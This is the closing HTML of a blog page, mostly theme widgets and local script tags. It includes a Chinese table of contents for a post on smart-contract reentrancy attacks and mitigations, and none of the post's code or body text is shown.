    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-expand-width flex-center">
            <i class="fas fa-arrows-alt-h"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
    </ul>
</div>

    </div>

    
        <aside class="page-aside">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="nav-text">原理分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#fallback%E5%87%BD%E6%95%B0"><span class="nav-text">fallback函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9Edemo"><span class="nav-text">漏洞demo</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%90%88%E7%BA%A6"><span class="nav-text">攻击合约</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B"><span class="nav-text">复现过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD"><span class="nav-text">虚拟机中</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E9%93%BE%E4%B8%8A"><span class="nav-text">测试链上</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%87%8D%E5%85%A5%E6%AC%A1%E6%95%B0"><span class="nav-text">重入次数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%84%E9%81%BF%E5%BB%BA%E8%AE%AE"><span class="nav-text">规避建议</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="nav-text">方法二</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89"><span class="nav-text">方法三</span></a></li></ol></li></ol>
    </div>
</div>
        </aside>
    

    <div class="image-viewer-container">
    <img src="">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="Search..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="popup-btn-close">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>




<script src="/js/utils.js"></script>

<script src="/js/main.js"></script>

<script src="/js/header-shrink.js"></script>

<script src="/js/back2top.js"></script>

<script src="/js/dark-light-toggle.js"></script>



    
<script src="/js/local-search.js"></script>




    
<script src="/js/code-copy.js"></script>




    
<script src="/js/lazyload.js"></script>



<div class="post-scripts">
    
        
<script src="/js/left-side-toggle.js"></script>

<script src="/js/libs/anime.min.js"></script>

<script src="/js/toc.js"></script>

    
</div>



</body>
</html>
